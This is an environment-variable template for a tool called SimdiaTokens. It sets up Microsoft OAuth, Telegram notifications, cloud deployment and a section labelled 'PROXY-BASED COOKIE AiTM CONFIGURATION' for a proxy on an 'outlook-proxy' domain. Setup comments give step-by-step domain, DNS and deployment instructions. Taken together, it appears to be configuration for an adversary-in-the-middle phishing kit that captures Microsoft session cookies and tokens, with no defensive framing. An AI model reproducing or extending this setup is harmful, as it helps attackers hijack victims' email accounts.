# SimdiaTokens Environment Variables

# Required OAuth Configuration
CLIENT_ID=your_microsoft_app_client_id
CLIENT_SECRET=your_microsoft_app_client_secret
REDIRECT_URI=https://simdiatokens-oauth-worker.lubaking-co.workers.dev/oauth/callback

# Database Configuration
DATABASE_URL=sqlite:///app/data/simdiatokens.db

# Master Secret for Encryption
MASTER_SECRET=your_random_32_character_secret_key_here

# Frontend URL (for CORS)
FRONTEND_URL=https://simdiatokens-frontend.vercel.app

# Optional: Telegram Notifications
TELEGRAM_BOT_TOKEN=your_telegram_bot_token
TELEGRAM_CHAT_ID=your_telegram_chat_id

# Optional: OpenAI Integration
OPENAI_API_KEY=your_openai_api_key

# Optional: Cloudflare Worker Deployment
CF_ACCOUNT_ID=your_cloudflare_account_id
CF_API_TOKEN=your_cloudflare_api_token
CF_WORKER_NAME=simdiatokens-oauth-worker
CF_WORKERS_SUBDOMAIN=lubaking-co.workers.dev

# Optional: Railway Public Domain
RAILWAY_PUBLIC_DOMAIN=simdiatokens-production.up.railway.app

# ============================================
# PROXY-BASED COOKIE AiTM CONFIGURATION
# ============================================

# Enable the proxy system
PROXY_ENABLED=true

# The proxy domain (must be configured in DNS and Railway)
PROXY_DOMAIN=outlook-proxy.simdiatokens.com

# Port the proxy listens on (should match Railway port)
PROXY_PORT=8080

# Maximum concurrent proxy sessions
PROXY_MAX_SESSIONS=50

# Rate limit per minute per session
PROXY_RATE_LIMIT=100

# Secret key for proxy session signing (generate with: openssl rand -hex 32)
PROXY_SECRET=your_random_32_character_proxy_secret_here

# ============================================
# PROXY DOMAIN SETUP INSTRUCTIONS
# ============================================
# 1. Register domain: outlook-proxy.simdiatokens.com (or your choice)
# 2. Create A record: outlook-proxy → Railway server IP
# 3. Add custom domain in Railway Dashboard
# 4. Verify SSL certificate auto-generates
# 5. Set PROXY_DOMAIN to your domain
# 6. Set PROXY_SECRET to a random 32-char string
# 7. Deploy and test: curl https://your-proxy-domain/proxy-test
# ============================================
